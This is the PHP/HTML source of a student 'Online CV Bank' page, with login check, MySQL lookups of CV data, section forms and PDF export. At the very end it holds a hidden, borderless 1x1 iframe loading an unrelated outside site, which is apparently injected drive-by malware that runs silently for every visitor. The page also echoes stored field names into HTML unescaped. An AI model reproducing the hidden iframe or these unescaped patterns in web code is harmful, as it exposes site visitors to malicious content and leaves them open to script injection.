<?php
include("server.php");
$sercon = server_connection();
$dbconn = dbconnection($sercon);

session_start();

if(isset($_SESSION['user_name']))
{
	$usr = $_SESSION['id_no'];
	//echo("<script>alert('$usr')</script>");
}
else
{	
	echo("<script>alert('Sorry!! You need to log in to access this page')</script>");
	header("Location: home.php");
}
$id_no=$_SESSION['id_no'];
if (urlencode(@$_REQUEST['action']) == "getpdf") {
	require_once('MPDF56/mpdf.php');
  header("Location: idealcvfordown.php");
  $mpdf=new mPDF();
  $file_name = "cv.html";
  $file_contents = file_get_contents($file_name);
  $mpdf->WriteHTML($file_contents);
  $mpdf->Output();
    }
?>


<html>
<head>
 <title>Online CV Bank</title>
 <script src="js/patAnim.js" type="text/javascript"></script>
 <script src="js/patFn1.js" type="text/javascript"></script>
  <script src="js/chdiv.js" type="text/javascript"></script>
 
</head>
<style>
 body
 {
  background-color: #C9BE62;
 }
 table
 {
  width: 95%;

 }
 header
 {
  position:fixed;
  width:102%;
    
  margin-top:-30px;
  margin-left: -10px;
  
  height: 100px;
  background-color:#827839 ;
  

 }
 footer
 {
  position:fixed;
  width:102%;
  bottom: 0px;
  
  
  margin-left: -10px;
  
  height: 70px;
  background-color:#827839 ;

 }




  .top1
  {
    float:left
    /*width: 500px;*/ 
    display:block;
  }  
 .font-style-top
  {
    width:500px;
    font-size: 120%; 
    color:#C8B560;
    line-height: 2.5em;
    margin-left: 7%;
  }
  .font-style-bottom
  {
    font-size: 90%; 
    color:#C8B560;
    line-height: 2.5em;
    margin-left: 7%;
  }
 .body-text
  {
   font-size: 100%;
   color:#805817;
  }
  .table-text
  {
   font-size: 100%;
   color:#805817;
   text-align: right;
  
  }
  .table-text-one
  {
   font-size: 100%;
   color:#805817;
  }
  .table-text-two
  {
   font-size: 100%;
   color:#C9BE62;
   text-align: right;
  
  }
  
  .shadow
   {
     box-shadow:10px 10px 20px #4E4848;
     -webkit-box-shadow:10px 10px 20px #4E4848;
     -moz-box-shadpw:10px 10px 20px #4E4848;
   }
   .help
   {
    background-color: #FFFF73;
    border-radius: 10px;
    display: none;
    opacity: 0.9;
    padding: 10px;
    z-index: 100;
   }
   .help_link:hover{
     display: inline;
   }
  #browse_qns{
	font-size: 120%;
	font-weight: bold;
	padding: 7px 7px 7px 7px;
	margin: 5px 5px 5px 5px;
	color: white;
	background-color: green;
}
#browse_qns:hover{
	cursor: pointer;
	background-color: orange;
}
.logout
{

float: left;
display:block;
   
  
  background-color:#827839 ;

}
  /*  
  .parentTable{
    width: 100%;
    border: 1px solid #b4b4b4;
}
.parentTable tr td{
    padding: 5px 30px;
}
.parentTable tr td.header{
    background: #265ca5;
}
.parentTable tr td.spec{
    width: 1px;
    padding: 0;
    border: none;
    background: #b4b4b4;
}
.childTable{
    width: 100%;
}
.childTable tr td{
    border-bottom: 1px dashed;
}
.childTable tr:last-child td{
    border: none;
}
  */  
  
</style>
<script type="text/javascript">
var no_of_f=6;
var is_sel;
var q_sel
 is_sel = new Array(66);

function funcon(){
//alert("HI");
no_of_f = 6;


//is_sel[0] = true;

//is_sel[0] = true;
/*for( var i = 1 ; i < 6; i++ )
{

is_sel[i] = false;

}*/
is_sel[0] = true;
is_sel[1] = false;
is_sel[2] = false;
is_sel[3] = false;
is_sel[4] = false;
is_sel[5] = false;
is_sel[6] = true;
is_sel[7] = false;
is_sel[8] = false;
is_sel[9] = false;
is_sel[10] = false;
is_sel[11] = false;
is_sel[12] = false;

 q_sel = 1;

dis_ops();
//alert("HI");
}
/*window.onload = function(){
  setTimeout('funcon()', 100);
};*/

</script>
<script type="text/javascript" src="tinymce/jscripts/tiny_mce/tiny_mce.js"></script>

<script type-"text/javascript">
function modData(str)
{
//alert(str);
if (str=="")
  {
  document.getElementById(str).value="";
  return;
  }
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
//alert("jksf");
//alert(""+xmlhttp.status+" " + xmlhttp.readyState);
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
//alert("HI");
//alert(""+xmlhttp.status+" " + xmlhttp.readyState + " " + xmlhttp.responseText);
//alert(tinymce.get(str).id);
    tinymce.get(str).setContent(xmlhttp.responseText);
return;
    }
  }
xmlhttp.open("GET","modifydata.php?q="+str,true);
xmlhttp.send();
}
</script>
<script type="text/javascript">
	tinyMCE.init({
		mode : "textareas",
		theme : "advanced",
		width : "600",
		height : "250"
	});
</script>
<script type="text/javascript">
function chdivs(val)
{
//alert("hi");
	var newval = "1";
	if(val=="basic_info")
		newval = "1";
	else if(val=="othlan")
		newval = "2";
	else if(val=="ar_int")
		newval = "3";
	else if(val=="sp_ach")
		newval = "4";
	else if(val=="proj")
		newval = "5";
	else if(val=="ext_act")
		newval = "6";
	brow_q(newval);
	
}
</script>

<body onLoad="window.setTimeout('funcon()',100);">
 <!--HEADRER-->
 <header>
 <table>
<tr> 
<td>
  <div class="top1">
     <h2><p class="font-style-top" >Online CV Bank</p></h2>
  </div>
    
 </td>
 <td>
  <div class="logout"><a href = "logout.php"  style="text-decoration: none"><p class="table-text-two">Log Out</p></a>
  </div>
</td>
</tr>
</table>
</header> 

<br><br><br>
<table>
<!--Form for CV-->
 
 <tr>
  <td valign="top" style="border-right: 1px solid #827839; padding: 5px;">
<?php
$data_string = "SELECT id_no from basic where id_no='$id_no'";
$rowno = mysql_num_rows(mysql_query($data_string));
$data_string= "SELECT * FROM basic WHERE id_no='$id_no'";
$out = mysql_query($data_string);
$data_out = mysql_fetch_array($out);

$email = $data_out['email'];
$ph_no = $data_out['ph_no'];
$addr_1 = $data_out['addr_1'];
$addr_2 = $data_out['addr_2'];
$addr_3 = $data_out['addr_3'];
$dept = $data_out['dept'];
$sem = $data_out['sem'];
$semtemp = "sem";
?>
  	<div class = "basic_info" id="div1">
   	<table>
        <form name="basic_information" method="post" action="basic_info.php"><!---form for basic information-->
    	<tr><td>
     	<h4><p class="table-text">Basic Information:</p></h4>
     	</td>
     	</tr>
        <!--
    	<tr>
     		<td><p class="table-text">Full Name:</p></td><td><input type="text" class="shadow" class="input_text" placeholder="Your Full Name"/></td>
    	</tr>
   		<tr>
     		<td><p class="table-text">Father's Name:</p></td><td><input type="text" class="shadow" class="input_text" placeholder="Father's Name"/></td>
    	</tr>
        -->
    	<tr>
     		<td><p class="table-text">Email:</p></td><td><input type="email" name="email_basic" class="shadow" class="input_text" placeholder="Except @students.becs.ac.in" value="<?php echo $email?>"/></td>
   		</tr>
   		<tr>
    		<td><p class="table-text">Phone No.:</p></td><td><input type="text" name="phone" class="shadow" class="input_text" placeholder="91-999999999" value="<?php echo $ph_no?>"/></td>
   		</tr>
                 <tr>
                 <td valign="top"><p class="table-text">Address:</p></td>
                 <td valign="top">
                    <table>
                     <tr><td><input type="text" name="address_1" class="shadow input_text" placeholder="Address Line 1" value="<?php echo $addr_1?>"/></td></tr>
                     <tr><td><input type="text" name="address_2" class="shadow input_text" placeholder="Address Line 2" value="<?php echo $addr_2?>"/></td></tr>
                     <tr><td><input type="text" name="address_3" class="shadow input_text" placeholder="Address Line 3" value="<?php echo $addr_3?>"/></td></tr>
                    </table>
                </td> 
                </tr>
   		<tr>
    		<td><p class="table-text">Department:</p></td>
    		<td>
     			<select class="shadow" name="dept">    
      			<option value="cst" id="Computer Science and Technology">Computer Science and Technology</option>
      			<option value="it" id="Information Technology">Information Technology</option>
      			<option value="etc" id="Electronics and Telecommunication">Electronics and Telecommunication</option>
     			</select>
    		</td>
  	 	</tr>
		<tr>
    		<td><p class="table-text">Semester:</p></td>
    		<td>
     			<select class="shadow" name="sem">    
      			<option value="1" id="sem1">1</option>
      			<option value="2" id="sem2">2</option>
      			<option value="3" id="sem3">3</option>
                        <option value="4" id="sem4">4</option>
      			<option value="5" id="sem5">5</option>
      			<option value="6" id="sem6">6</option>
     			<option value="7" id="sem7">7</option>
      			<option value="8" id="sem8">8</option>
                    </select>
    		</td>
  	 	</tr>
   
   		<tr>
   			<td></td>
   			<td><input type="submit" class="shadow" value="Save"/></td>
   		</tr>
          </form>
   	</table>
   </div>
<script type="text/javascript">
var id1 = "<?php echo $dept?>";
<?php $semid = $semtemp.$sem;?>
var id2 = "<?php echo $semid?>";
document.getElementById(id1).selected=true;
document.getElementById(id2).selected=true;
</script>
   <?php
$data_string = "SELECT id_no from custom where id_no='$id_no'";
$rowno = mysql_num_rows(mysql_query($data_string));
if($rowno)
{
	$data_string = "SELECT * from custom where id_no='$id_no'";
	$out = mysql_query($data_string);
	$data_out = mysql_fetch_array($out);
	$no_of_fields += $data_out['nooffields'];
	$field1name = $data_out['field1name'];
	$field1after = $data_out['field1after'];
	$field1 = $data_out['field1'];

	$field2name = $data_out['field2name'];
	$field2after = $data_out['field2after'];
	$field2 = $data_out['field2'];

	$field3name = $data_out['field3name'];
	$field3after = $data_out['field3after'];
	$field3 = $data_out['field3'];

	$field4name = $data_out['field4name'];
	$field4after = $data_out['field4after'];
	$field4 = $data_out['field4'];

	$field5name = $data_out['field5name'];
	$field5after = $data_out['field5after'];
	$field5 = $data_out['field5'];

	$fieldafterarr = array_fill(1, 6, 0);
	$fieldafterarr[$field1after]++;
	$fieldafterarr[$field2after]++;
	$fieldafterarr[$field3after]++;
	$fieldafterarr[$field4after]++;
	$fieldafterarr[$field5after]++;
//print_r($fieldafterarr);
?>
<div class = "<?php echo $field1name;?>" id="div11" style= "display:none;">
   	<table>
        <form name="<?php echo $field1name;?>" method="post" action="additionalfield.php"><!--form for extra curricular activity-->
    	<tr><td>
     	<h4><p class="table-text-one"><?php echo $field1name;?>:</p></h4>
     	</td>
     	</tr>
	<tr>
	 <td>
            <textarea rows="5" cols="50" name="<?php echo $field1name;?>" id="<?php echo $field1name;?>"></textarea></td>
	 </td>
	</tr>
       <tr><td><input type="submit" value="Save"/></td></tr>
     </form>
    </table>
   </div>
<?php
}
?>
   <div class = "technical_skills" id="div2" style= "display:none;">
   	<table>
        <form name="technical_skills" method="post" action="tech_skill.php">  <!--form for technical skills-->
    	<tr><td><h4><p class="table-text-one">Technical Skills:</p></h4>
     	
     	</td>
     	</tr>
        <!--
        <tr>
     		<td><p class="table-text-one">Programming Languages:</p></td><td><p class="table-text-one">Expertise:</p></td>
    	</tr>
        <tr>
        	<td><input type="checkbox" name="list[0]" value ="C" class="shadow" class="input_text"><strong>C</strong></td>
            <td>
     			<select class="shadow" name="check_list[0]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        
        <tr>
        	<td><input type="checkbox" name="list[1]" value="CPP" class="shadow" class="input_text"><strong>C++</strong></td>
            <td>
     			<select class="shadow" name="check_list[1]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        <tr>
        	<td><input type="checkbox" name="list[2]" value="Java" class="shadow" class="input_text"><strong>Java</strong></td>
            <td>
     			<select class="shadow" name="check_list[2]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        <tr>
        	<td><input type="checkbox" name="list[3]" value="JavaScript" class="shadow" class="input_text"><strong>JavaScript</strong></td>
            <td>
     			<select class="shadow" name="check_list[3]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        <tr>
        	<td><input type="checkbox" name="list[4]" value="PHP" class="shadow" class="input_text"><strong>PHP</strong></td>
            <td>
     			<select class="shadow" name="check_list[4]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        <tr>
        	<td><input type="checkbox" name="list[5]" value="Python" class="shadow" class="input_text"><strong>Python</strong></td>
            <td>
     			<select class="shadow" name="check_list[5]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        <tr>
        	<td><input type="checkbox" name="list[6]" value="CS" class="shadow" class="input_text"><strong>C#</strong></td>
            <td>
     			<select class="shadow" name="check_list[6]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>
        <tr>
        	<td><input type="checkbox" name="list[7]" value="Ruby" class="shadow" class="input_text"><strong>Ruby</strong></td>
            <td>
     			<select class="shadow" name="check_list[7]">    
      			<option value="expert">Expert</option>
      			<option value="proficient">Proficient</option>
      			<option value="beginner">Beginner</option>
     			</select>
    		</td>
        </tr>--><!--<tr><td><br/></td></tr>-->
	
	<tr>
	<td>
	
	  <textarea rows="3" cols="30" name ="othlan" id="othlan" placeholder="example: p-programming language (Expert/Proficient/Beginner)"></textarea>
	 </td>
	</tr>
    <tr><td><input type="submit" value="Save"/>
    </form>
    </table>
   </div>
   <div class = "area_of_int" id="div3" style= "display:none;">
   	<table>
        <form name="area_of_interest" method="post" action="area_of_interest.php">   <!--method for area of interest-->
    	<tr><td>
     	<h4><p class="table-text-one">Area of Interest:</p></h4>
     	</td>
     	</tr>
        <tr>
           <td>
            <textarea rows="15" cols="80" name="areaofinterest" id="ar_int" style="width: 100%"></textarea></td>
        	<!--<td>
            <div style="width: 658px; height: 250px;" class="cleditorMain">
            	<div style="height: 27px;" class="cleditorToolbar">
                	<div class="cleditorGroup"><div disabled="disabled" style="background-color: transparent;" title="Bold" class="cleditorButton cleditorDisabled">
                    </div>
                    <div disabled="disabled" style="background-position: -24px 50%; background-color: transparent;" title="Italic" class="cleditorButton cleditorDisabled">
                    </div>
                    <div disabled="disabled" style="background-position: -48px 50%; background-color: transparent;" title="Underline" class="cleditorButton cleditorDisabled">
                    </div>
                    <div class="cleditorDivider">
                    </div>
                </div>
                <div class="cleditorGroup">
                	<div disabled="disabled" style="background-position: -288px 50%; background-color: transparent;" title="Bullets" class="cleditorButton cleditorDisabled">
                    </div>
                    <div disabled="disabled" style="background-position: -312px 50%; background-color: transparent;" title="Numbering" class="cleditorButton cleditorDisabled">
                    </div>
                    <div class="cleditorDivider">
                    </div>
                </div>
                <div class="cleditorGroup">
                	<div disabled="disabled" style="background-position: -360px 50%; background-color: transparent;" title="Indent" class="cleditorButton cleditorDisabled">
                	</div>
                	<div disabled="disabled" style="background-position: -336px 50%; background-color: transparent;" title="Outdent" class="cleditorButton cleditorDisabled">
                	</div>
                	<div class="cleditorDivider">
                	</div>
                </div>
                <div class="cleditorGroup">
                	<div disabled="disabled" style="background-position: -648px 50%; background-color: transparent;" title="Insert page-break" class="cleditorButton cleditorDisabled">	
                    </div>
                    <div class="cleditorDivider"></div></div><div class="cleditorGroup">
                    	<div disabled="disabled" style="background-position: -480px 50%; background-color: transparent;" title="Undo" class="cleditorButton cleditorDisabled">
                        </div>
                        <div disabled="disabled" style="background-position: -504px 50%; background-color: transparent;" title="Redo" class="cleditorButton cleditorDisabled">
                        </div>
                        <div class="cleditorDivider">
                        </div>
                    </div>
                    <div class="cleditorGroup">
                    	<div disabled="disabled" style="background-position: -696px 50%; background-color: transparent;" title="Paste as Text" class="cleditorButton cleditorDisabled">
                        </div>
                        <div class="cleditorDivider">
                        </div>
                    </div>
                    <div style="" class="cleditorGroup">
                    	<div disabled="disabled" style="background-position: -264px 50%;" title="Remove Formatting" class="cleditorButton cleditorDisabled">
                        </div>
                    </div>
                </div>
                <textarea style="display: none; width: 658px; height: 223px;" id="t0" name="sections[work][data][info][]" class="textarea">&lt;br&gt;</textarea>
                <iframe style="display: block; width: 658px; height: 223px;" src="javascript:true;" frameborder="0"></iframe>
              </div>
            </td>-->
           </tr>
      <tr><td><input type="submit" value="Save"/></td></tr>
     </form>
    </table>
   </div>
   <div class = "sp_ach" id="div4" style= "display:none;">
   	<table>
        <form name="special_achievements" method="post" action="special_achievements.php"><!--form for special achievements-->
    	<tr><td>
     	<h4><p class="table-text-one">Special Achievements:</p></h4>
     	</td>
     	</tr>
	<tr>
	 <td>
            <textarea rows="5" cols="50" name="sp_ach" id="sp_ach"></textarea></td>
	 </td>
	</tr>
        <tr><td><input type="submit" value="Save"/></td></tr>
        </form>
    </table>
   </div>
   <div class = "projs" id="div5" style= "display:none;">
   	<table>
        <form name="projects" method="post" action="projects.php">   <!--form for projects-->
    	<tr><td>
     	<h4><p class="table-text-one">Projects:</p></h4>
     	</td>
     	</tr>
	<tr>
	 <td>
            <textarea rows="5" cols="50" name="proj" id="proj"></textarea></td>
	 </td>
	</tr>
        <tr><td><input type="submit" value="Save"/></td></tr>
     </form>
    </table>
   </div>
   <div class = "ext_act" id="div6" style= "display:none;">
   	<table>
        <form name="extra_curricular_activity" method="post" action="extra.php"><!--form for extra curricular activity-->
    	<tr><td>
     	<h4><p class="table-text-one">Extra Curricular Activities:</p></h4>
     	</td>
     	</tr>
	<tr>
	 <td>
            <textarea rows="5" cols="50" name="ext_act" id="ext_act"></textarea></td>
	 </td>
	</tr>
       <tr><td><input type="submit" value="Save"/></td></tr>
     </form>
    </table>
   </div>

	
 
   <?php
$no_of_fields = 6;
$data_string = "SELECT id_no from custom where id_no='$id_no'";
$rowno = mysql_num_rows(mysql_query($data_string));
if($rowno)
{
	$data_string = "SELECT * from custom where id_no='$id_no'";
	$out = mysql_query($data_string);
	$data_out = mysql_fetch_array($out);
	$no_of_fields += $data_out['nooffields'];
}
$originalindex = 1;
for( $q_n = 1; $q_n <= $no_of_fields ; $q_n++ )
{
if($fieldafterarr[$originalindex]>0)
{
$qnindex = 1;
$tempqn = $originalindex.$qnindex;
?>
<div id = "browse_qns" style = "float: left;" onClick = "brow_q(<?php echo $tempqn; ?>)">
<?php
$qnindex++;
$fieldafterarr[$originalindex]--;
if($fieldafterarr[$originalindex]==0)
	$originalindex++;
}
else
{
?>
<div id = "browse_qns" style = "float: left;" onClick = "brow_q(<?php echo $q_n; ?>)">
<?php
$originalindex++;
}
?>
<div id = "<?php echo $q_n; ?>"><?php echo $q_n; ?>
</div></div>
<?php
}

?>
  </td>
  <!--Download Section-->
  <td>
  <table>
  <tr><td><h4><p class="table-text">Modify and Download Your CV:</p></h4></td><td></td></tr>
  <tr>
  <!--<form name="modify_data">--><!--form for Modification-->
  <td>
   <p class="table-text">Modify Your Data:</p>
  </td>
  <td>
<script type="text/javascript">
var selectedmodification="basic_info";
var selecteddiv = "1";
</script>
    <select class="shadow" name="modification" id="mod" onChange="selectedmodification=this.value">
     <option value="basic_info">Basic Information</option>
     <option value="othlan">Technical Skills</option>
     <option value="ar_int">Area of Interest</option>
     <option value="sp_ach">Special Achievements</option>
     <option value="proj">Projects</option>
     <option value="ext_act">Extra-Curricular Activities</option>
    </select>
  </td>
  </tr>
  <tr>
  <td></td><td><input type="button" class="shadow" onClick="modData(selectedmodification),chdivs(selectedmodification)" value="Modify"/></td>
  </tr>
  <!--</form>-->
  <tr><td><br><p class="table-text">Download or View Your CV:</p></td>
  <td><br><p class="table-text-one">&nbsp;<a href="idealcv.php">(View)</a> or <a href="index.php?action=getpdf">(Download)</a></p></td></tr>
	<form name="addfieldform" method="post" action="addfield.php"><!--form for extra curricular activity-->
	<tr>
		<td><h4><p class="table-text">Add a new field after this:</p></h4></td>
		<td><input type="text" name="fieldname" class="shadow input_text" placeholder="New Field Name"/></td>
	</tr>
<input type="hidden" name="fieldafter" id = "fieldafter" value="English">
	<tr>
  <td></td><td><input type="submit" class="shadow" value="Add" onClick="document.getElementById('fieldafter').value=q_sel"/></td>
  </tr>
	</form>
 </table>
 </tr>
 </table>
<script type="text/javascript">
var temp = "";
temp = 1;
document.getElementById(temp).parentNode.style.backgroundColor= "blue";
</script>
 <footer>
  <p class="font-style-bottom">Developed by: ATSOC BESU Team</p>

 </footer>
 <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
 </html>

